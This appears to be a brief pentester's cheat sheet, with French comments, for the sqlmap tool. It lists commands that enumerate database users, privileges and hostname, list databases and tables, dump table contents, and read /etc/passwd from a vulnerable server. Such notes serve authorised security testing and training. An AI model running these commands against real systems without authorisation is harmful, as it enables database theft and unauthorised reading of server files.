ref : https://www.vaadata.com/en/blog/sqlmap-the-tool-for-detecting-and-exploiting-sql-injections/

ref : https://hackviser.com/tactics/tools/sqlmap

```bash
# Retoruver les informations system
sqlmap -r req.txt --current-user
sqlmap -r req.txt --is-dba
sqlmap -r req.txt --hostname
sqlmap -r req.txt --users
sqlmap -r req.txt --privileges


# Commande de base pour exploit un SQLi 
sqlmap -r req.txt 
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D <NOM_DB> --tables
sqlmap -r req.txt -D <NOM_DB> -T <NOM_TABLE> --columns
sqlmap -r req.txt -D <NOM_DB> -T <NOM_TABLE> --dump
sqlmap -r req.txt -D <NOM_DB> -T <NOM_TABLE> -C <col1>,<col2>,<col3> --dump

```

```bash 
# Exploiter le LFI (Local File Inclusion)
sqlmap -r trick.req --file-read=/etc/passwd --batch 
```
